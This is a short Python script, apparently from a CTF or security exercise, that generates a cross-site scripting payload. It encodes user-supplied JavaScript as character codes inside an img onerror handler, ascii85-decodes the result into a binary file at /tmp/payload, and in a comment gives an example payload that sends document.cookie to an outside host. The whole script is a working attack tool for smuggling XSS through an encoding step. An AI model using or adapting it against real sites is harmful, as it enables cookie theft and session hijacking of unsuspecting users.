import sys
from base64 import a85decode
user_payload = sys.argv[1]

print('Adding payload', user_payload)

# repr(list(map(ord, "fetch('https://niels.com/' + document.cookie)"))).replace(' ', '')
payload = repr(list(map(ord, user_payload))).replace(' ', '').encode()

completed_payload = b'a<img/src/onerror=Function(String.fromCharCode(' + payload[1:-1] + b'))()>ba'
print('PAYLOAD', completed_payload)
binary = a85decode(completed_payload)

with open('/tmp/payload', 'wb') as f:
    f.write(binary)

print('Payload created in /tmp/payload')
